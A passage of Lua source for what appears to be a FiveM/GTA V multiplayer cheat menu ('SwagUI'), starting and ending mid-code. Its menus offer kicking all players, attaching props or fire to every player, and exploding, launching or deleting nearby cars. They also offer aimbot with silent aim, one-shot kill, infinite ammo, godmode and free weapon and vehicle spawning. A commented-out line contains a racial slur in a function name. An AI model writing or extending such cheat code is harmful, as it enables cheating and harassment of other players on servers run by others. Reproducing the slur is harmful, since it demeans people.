				KickAll()
			end
			
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("objattatch") then
		
			if SwagUI.Button("Dog House All") then
				DogHouseAll("prop_doghouse_01")
			end	
			
			if SwagUI.Button("Dog Pin All") then
				DogHouseAll("hei_prop_heist_apecrate")
			end
		
			if SwagUI.Button("Burger All Players") then
				BurgerAll()
			end	
			
			if SwagUI.Button("Small Plane All") then
				AttachPropAll("p_med_jet_01_s")
			end
			
			if SwagUI.Button("Med Plane All") then
				AttachPropAll("p_med_jet_01_s")
			end
			
			if SwagUI.Button("Big Plane All") then
				AttachPropAll("p_cs_mp_jet_01_s")
			end
			
			if SwagUI.Button("Boat All") then
				AttachPropAll("prop_byard_rowboat4")
			end
			
			if SwagUI.Button("Tram All") then
				AttachPropAll("p_tram_crash_s")
			end
			
			if SwagUI.Button("UFO All") then
				AttachPropAll("p_spinning_anus_s")
			end
			
			if SwagUI.Button("Helicopter All") then
				AttachPropAll("prop_crashed_heli")
			end	
				
			
			if SwagUI.Button("Turret All") then
				AttachPropAll("hei_prop_carrier_defense_01")
			end	
			
			if SwagUI.Button("Radar All") then
				AttachPropAll("hei_prop_carrier_radar_1")
			end
			
			if SwagUI.Button("BeachFire All Players") then
				FireAll()
			end
			
			if SwagUI.Button("Ramp All Players") then
				RampAll()
			end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("NearbyCarTroll") then
			if SwagUI.CheckBox("EMP Nearby Vehicles", emp_nearby_cars, function(enabled) emp_nearby_cars = enabled end) then end
			
			if SwagUI.CheckBox("Delete Nearby Vehicles", destroy_cars, function(enabled) destroy_cars = enabled end) then end
			
			if SwagUI.CheckBox("Launch Nearby Cars", launch_cars, function(enabled) launch_cars = enabled end) then end
			
			if SwagUI.CheckBox("Alarm Nearby Cars", alarm_cars, function(enabled) alarm_cars = enabled end) then end
			
			if SwagUI.CheckBox("Burger Nearby Cars", burger_cars, function(enabled) burger_cars = enabled end) then end
			
			if SwagUI.CheckBox("Explode Nearby Cars", explode_cars, function(enabled) explode_cars = enabled end) then end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalWepMenu") then
			
			if SwagUI.MenuButton("Weapon Spawner", "LocalWepCategory") then
			end
			
			if SwagUI.MenuButton("Ammo", "AmmoSettings") then
			end
			
			if SwagUI.MenuButton("Bullets", "BulletSettings") then
			end
			
			if SwagUI.MenuButton("ToolBox", "ToolBoxs") then
			end
			
			if SwagUI.MenuButton("Aimbot", "aimbotoptions") then
			end
			-- print(GetEntitySpeed(Swag.Player.Vehicle) * 2.2369356)
			
			SwagUI.Display()
			-- [NOTE] Local Weapon Menu
		elseif SwagUI.IsMenuOpened("AimbotOptions") then
		
			if SwagUI.Button("Aimbot") then
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("aimbotoptions") then
		
			if SwagUI.CheckBox("Enabled", aimbot_enabled, function(enabled) aimbot_enabled = enabled end) then end
			if SwagUI.CheckBox("Silent", aimbot_silent, function(enabled) aimbot_silent = enabled end) then end
			if SwagUI.CheckBox("Peds", aimbot_peds, function(enabled) aimbot_peds = enabled end) then end
			--if SwagUI.CheckBox("Vis Check", aimbot_vis, function(enabled) aimbot_vis = enabled end) then end
			
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("ToolBoxs") then

			if SwagUI.CheckBox("Rope Gun (L=Remove)", rope_gun, function(enabled) rope_gun = enabled end) then end
			if SwagUI.CheckBox("Rope Gun To Self", rope_gun_self, function(enabled) rope_gun_self = enabled end) then end
			if SwagUI.CheckBox("Teleport Gun", TeleportGun, function(enabled) TeleportGun = enabled end) then end
			if SwagUI.CheckBox("Delete Gun", Swag.Toggle.DeleteGun) then 
				Swag.Toggle.DeleteGun = not Swag.Toggle.DeleteGun
			end


			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("BulletSettings") then
			if SwagUI.CheckBox("Vehicle Gun", VehicleGun, function(enabled) VehicleGun = enabled end) then end
			if SwagUI.CheckBox("Ped Launch Gun", pedGun, function(enabled) pedGun = enabled end) then end
			if SwagUI.CheckBox("Launch Gun", LaunchGun, function(enabled) LaunchGun = enabled end) then end
			if SwagUI.CheckBox("Spawn Attacking Ped", PokiBall, function(enabled) PokiBall = enabled end) then end
			if SwagUI.CheckBox("Spawn Friendly Ped", Fped, function(enabled) Fped = enabled end) then end
		

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("AmmoSettings") then
		
			if SwagUI.Button("Set current weapon ammo") then
				local _, weaponHash = GetCurrentPedWeapon(PlayerPedId())
				local amount = KeyboardInput("Ammo amount", "", 3)
				local ammo = floor(tonumber(amount) + 0.5)
				SetPedAmmo(PlayerPedId(), weaponHash, ammo)
			end
			
			if SwagUI.Button("Max Ammo All Guns") then
				for i = 1, #t_Weapons do
					AddAmmoToPed(GetPlayerPed(-1), GetHashKey(t_Weapons[i][1]), 250.0)
				end
			end
			
			if SwagUI.CheckBox("Infinite Ammo", InfAmmo, function(enabled) InfAmmo = enabled SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo) end) then end
			
			if SwagUI.CheckBox("Rapid Fire", Swag.Toggle.RapidFire) then
				Swag.Toggle.RapidFire = not Swag.Toggle.RapidFire
			end
			
			if SwagUI.Slider("Damage Modifier", SliderOptions.DamageModifier.Words, SliderOptions.DamageModifier.Selected, function(selectedIndex)
				if SliderOptions.DamageModifier.Selected ~= selectedIndex then
					SliderOptions.DamageModifier.Selected = selectedIndex
				end
			end) then end
			
			if SwagUI.CheckBox("One Shot Kill", OneShot, function(enabled) OneShot = enabled end) then end
			
			if SwagUI.CheckBox("One Shot Cars", OneShotCar, function(enabled) OneShotCar = enabled end) then end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalWepCategory") then
			if SwagUI.Button("Give All Weapons") then
				--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				for i = 1, #t_Weapons do
					GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], 256, false, false)
				end
			end
			
			if SwagUI.Button("Remove All Weapons") then
				for i = 1, #t_Weapons do
					RemoveWeaponFromPed(PlayerPedId(), t_Weapons[i][1])
				end
			end
			SwagUI.MenuButton("Melee", "LocalMeleeWeapons")
			SwagUI.MenuButton("Handguns", "LocalSidearmWeapons")
			SwagUI.MenuButton("Submachine Guns", "LocalSmgWeapons")
			SwagUI.MenuButton("Shotguns", "LocalShotgunWeapons")
			SwagUI.MenuButton("Assault Rifles", "LocalAssaultRifleWeapons")
			SwagUI.MenuButton("Light Machine Guns", "LocalMachineGunWeapons")
			SwagUI.MenuButton("Sniper Rifles", "LocalSniperRifles")
			SwagUI.MenuButton("Heavy Weapons", "LocalHeavyWeapons")

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalMeleeWeapons") then
			local selectedWeapon = {}
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "melee" then
					if SwagUI.Button(t_Weapons[i][2]) then
						--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], 0, false, false)
					end
					selectedWeapon[optionCount] = i
				end
			end

			-- SwagUI.DrawWeaponPreview(selectedWeapon[menus[currentMenu].currentOption])
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalSidearmWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "handguns" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if SwagUI.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if SwagUI.Button(t_Weapons[i][2]) then
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalAssaultRifleWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "assaultrifles" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if SwagUI.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if SwagUI.Button(t_Weapons[i][2]) then
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalShotgunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "shotguns" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if SwagUI.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if SwagUI.Button(t_Weapons[i][2]) then
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			SwagUI.Display()	
		elseif SwagUI.IsMenuOpened("LocalMachineGunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "lmgs" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if SwagUI.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if SwagUI.Button(t_Weapons[i][2]) then
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalSmgWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "smgs" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if SwagUI.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if SwagUI.Button(t_Weapons[i][2]) then
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalSniperRifles") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "sniperrifles" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if SwagUI.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if SwagUI.Button(t_Weapons[i][2]) then
							--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalHeavyWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "heavyweapons" then
					if SwagUI.Button(t_Weapons[i][2]) then
						--PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
					end
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalVehicleMenu") then

			if SwagUI.ComboBox("Vehicle Actions", ComboOptions.VehicleActions.Words, ComboOptions.VehicleActions.Selected, function(selectedIndex)
				if ComboOptions.VehicleActions.Selected ~= selectedIndex then
					ComboOptions.VehicleActions.Selected = selectedIndex
				end
			end) then 
				ComboOptions.VehicleActions.Values[ComboOptions.VehicleActions.Selected](Swag.Player.Vehicle)
			end

			if SwagUI.MenuButton("Vehicle Spawner", "LocalVehicleSpawner") then
			end
			if SwagUI.MenuButton("Modify Vehicle", "LSC") then end
			
			if SwagUI.MenuButton("Boost Options", "VehicleSpeed") then
			end
			
			if SwagUI.MenuButton("Vehicle Effects", "Vdrive") then
			end
			
			if SwagUI.MenuButton("Fun Vehicles", "VFun") then
			end
			
			if SwagUI.MenuButton("Drive Effects", "Deffects") then
			end
			
--//Boost

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("Vdrive") then
			if Swag.Player.IsInVehicle then
				if SwagUI.CheckBox("Easy Handling", Swag.Toggle.EasyHandling) then
					Swag.Toggle.EasyHandling = not Swag.Toggle.EasyHandling
				end
				
				if SwagUI.CheckBox("No Collision", Swag.Toggle.VehicleCollision, function(enabled) 
					Swag.Toggle.VehicleCollision = enabled
				end) then end
				
				if SwagUI.CheckBox("Car WallRiding", Swag.Toggle.CWallride) then
					Swag.Toggle.CWallride = not Swag.Toggle.CWallride
				end
				
				if SwagUI.CheckBox("Drive UnderWater", Swag.Toggle.Waterp) then
				Swag.Toggle.Waterp = not Swag.Toggle.Waterp
				end
				
				if SwagUI.CheckBox("Longer Tire Smoke", Swag.Toggle.TireSmoke) then
					Swag.Toggle.TireSmoke = not Swag.Toggle.TireSmoke
				end
			
				if SwagUI.CheckBox("Rainbow Vehicle Color", Swag.Toggle.RainbowVehicle, RainbowVehicle) then 
				end
				
			else
				if SwagUI.Button("No vehicle found") then
				end
			end



			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("VFun") then
			if Swag.Player.IsInVehicle then
				if SwagUI.CheckBox("Scary BullDozer", Swag.Toggle.DBull, function(enabled) 
					Swag.Toggle.DBull = enabled
					if Swag.Toggle.DBull then
						local veh = SpawnLocalVehicle("BULLDOZER", true, true)
						SetVehicleCanBreak(veh, false)
						SetVehicleCanBeVisiblyDamaged(veh, false)
						SetVehicleEnginePowerMultiplier(veh, 2500.0)
						SetVehicleEngineTorqueMultiplier(veh, 2500.0)
						SetVehicleEngineOn(veh, 1, 1, 1)
						SetVehicleGravityAmount(veh, 50.0)
						SetVehicleColours(veh, 27, 27)
					elseif IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
						DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
					end
				end) then end
				
				if SwagUI.CheckBox("Forklift Anything (E)", Swag.Toggle.Forklift) then
					Swag.Toggle.Forklift = not Swag.Toggle.Forklift
				end
				
				--if SwagUI.ComboBox("Fun Cars", ComboOptions.fcars.Words, ComboOptions.fcars.Selected, function(selectedIndex)
				--	if ComboOptions.fcars.Selected ~= selectedIndex then
				--		ComboOptions.fcars.Selected = selectedIndex
						
				--	end
				--end) then 
				--shootfuckingstupidniggers()
				--end
				
			else
				if SwagUI.Button("No vehicle found") then
				end
			end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("VehicleSpeed") then
			if Swag.Player.IsInVehicle then
				if SwagUI.CheckBox("~r~Speedboost ~s~SHIFT CTRL", VehSpeed,
						function(enabled)
						VehSpeed = enabled
						end)
					then
				end
				
				if SwagUI.Slider("Torque Boost", SliderOptions.TorqueBoost.Words, SliderOptions.TorqueBoost.Selected, function(selectedIndex)
					if SliderOptions.TorqueBoost.Selected ~= selectedIndex then 
						SliderOptions.TorqueBoost.Selected = selectedIndex
					end
				end) then end

			else
				if SwagUI.Button("No vehicle found") then
				end
			end
                         
			
--//Boost End
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LocalVehicleSpawner") then
			if SwagUI.CheckBox("Spawn Inside", Swag.Toggle.SpawnInVehicle, function(enabled)
				Swag.Toggle.SpawnInVehicle = enabled
			end) then end
			
			if SwagUI.CheckBox("Replace Current", Swag.Toggle.ReplaceVehicle, function(enabled) 
				Swag.Toggle.ReplaceVehicle = enabled 
			end) then end

			if SwagUI.Button("Spawn Vehicle by Hash") then
				local modelName = KeyboardInput("Enter vehicle spawn name", "", 20)
				if not modelName then -- Do nothing in case of accidentel press or change of mind
				elseif IsModelValid(modelName) and IsModelAVehicle(modelName) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				else
					SwagUI.SendNotification({text = string.format("%s is not a valid vehicle", modelName), type = 'error'})
				end
			end
			if SwagUI.MenuButton("Compacts", "localcompacts") then end
			if SwagUI.MenuButton("Sedans", "localsedans") then end
			if SwagUI.MenuButton("SUVs", "localsuvs") then end
			if SwagUI.MenuButton("Coupes", 'localcoupes') then end
			if SwagUI.MenuButton("Muscle", 'localmuscle') then end
			if SwagUI.MenuButton("Sports Classics", 'localsportsclassics') then end
			if SwagUI.MenuButton("Sports", 'localsports') then end
			if SwagUI.MenuButton("Super", 'localsuper') then end
			if SwagUI.MenuButton('Motorcycles', 'localmotorcycles') then end
			if SwagUI.MenuButton('Off-Road', 'localoffroad') then end
			if SwagUI.MenuButton('Industrial', 'localindustrial') then end
			if SwagUI.MenuButton('Utility', 'localutility') then end
			if SwagUI.MenuButton('Vans', 'localvans') then end
			if SwagUI.MenuButton('Cycles', 'localcycles') then end
			if SwagUI.MenuButton('Boats', 'localboats') then end
			if SwagUI.MenuButton('Helicopters', 'localhelicopters') then end
			if SwagUI.MenuButton('Planes', 'localplanes') then end
			if SwagUI.MenuButton('Service/Emergency/Military', 'localservice') then end
			if SwagUI.MenuButton('Commercial/Trains', 'localcommercial') then end
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localcompacts') then
			for i = 1, #VehicleClass.compacts do
				local modelName = VehicleClass.compacts[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('compacts')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localsedans') then
			for i = 1, #VehicleClass.sedans do
				local modelName = VehicleClass.sedans[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('sedans')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localsuvs') then
			for i = 1, #VehicleClass.suvs do
				local modelName = VehicleClass.suvs[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('suvs')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localcoupes') then
			for i = 1, #VehicleClass.coupes do
				local modelName = VehicleClass.coupes[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('coupes')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localmuscle') then
			for i = 1, #VehicleClass.muscle do
				local modelName = VehicleClass.muscle[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('muscle')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localsportsclassics') then
			for i = 1, #VehicleClass.sportsclassics do
				local modelName = VehicleClass.sportsclassics[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('sportsclassics')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localsports') then
			for i = 1, #VehicleClass.sports do
				local modelName = VehicleClass.sports[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('sports')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localsuper') then
			for i = 1, #VehicleClass.super do
				local modelName = VehicleClass.super[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('super')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localmotorcycles') then
			for i = 1, #VehicleClass.motorcycles do
				local modelName = VehicleClass.motorcycles[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('motorcycles')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localoffroad') then
			for i = 1, #VehicleClass.offroad do
				local modelName = VehicleClass.offroad[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('offroad')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localindustrial') then
			for i = 1, #VehicleClass.industrial do
				local modelName = VehicleClass.industrial[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('industrial')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localutility') then
			for i = 1, #VehicleClass.utility do
				local modelName = VehicleClass.utility[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('utility')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localvans') then
			for i = 1, #VehicleClass.vans do
				local modelName = VehicleClass.vans[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('vans')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localcycles') then
			for i = 1, #VehicleClass.cycles do
				local modelName = VehicleClass.cycles[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('cycles')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localboats') then
			for i = 1, #VehicleClass.boats do
				local modelName = VehicleClass.boats[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('boats')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localhelicopters') then
			for i = 1, #VehicleClass.helicopters do
				local modelName = VehicleClass.helicopters[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('helicopters')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localplanes') then
			for i = 1, #VehicleClass.planes do
				local modelName = VehicleClass.planes[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('planes')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localservice') then
			for i = 1, #VehicleClass.service do
				local modelName = VehicleClass.service[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('service')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('localcommercial') then
			for i = 1, #VehicleClass.commercial do
				local modelName = VehicleClass.commercial[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if SwagUI.Button(vehname) then
					SpawnLocalVehicle(modelName, Swag.Toggle.ReplaceVehicle, Swag.Toggle.SpawnInVehicle)
				end
			end

			SwagUI.DrawVehiclePreview('commercial')
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("LSC") then
			if Swag.Player.IsInVehicle then
				if SwagUI.MenuButton("Bodywork", "lsc_bodywork") then
					LSC.UpdateMods()
				end
				
				if SwagUI.Button("Max Tuning") then
					MaxOut1()
				end
				
				if SwagUI.CheckBox("Vehicle Godmode", VehGod,
						function(enabled)
							VehGod = enabled
						end) 
					then
				end
				
				if SwagUI.ComboBox("Vehicle Hygiene", ComboOptions.DirtLevel.Words, ComboOptions.DirtLevel.Selected(Swag.Player.Vehicle), function(selectedIndex)
				if ComboOptions.DirtLevel.Selected(Swag.Player.Vehicle) ~= ComboOptions.DirtLevel.Values[selectedIndex] then
					SetVehicleDirtLevel(Swag.Player.Vehicle, ComboOptions.DirtLevel.Values[selectedIndex])
				end
				end) then end
				
				if SwagUI.Button("Change License Plate") then
				ChangeVehiclePlateText(Swag.Player.Vehicle)
				end
				
				if SwagUI.MenuButton("Performance Tuning", "lsc_performance") then
					LSC.UpdateMods()
				end
				
				if SwagUI.CheckBox("Seatbelt", Swag.Toggle.VehicleNoFall) then
					Swag.Toggle.VehicleNoFall = not Swag.Toggle.VehicleNoFall
				end
				
			else
				if SwagUI.Button("No vehicle found") then
				end
			end
			
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("lsc_bodywork") then
			local installed = currentMods
			if Swag.Player.IsInVehicle then
				for i, mod in pairs(LSC.vehicleMods) do
					SetVehicleModKit(Swag.Player.Vehicle, 0)
					local modCount = GetNumVehicleMods(Swag.Player.Vehicle, mod.id)
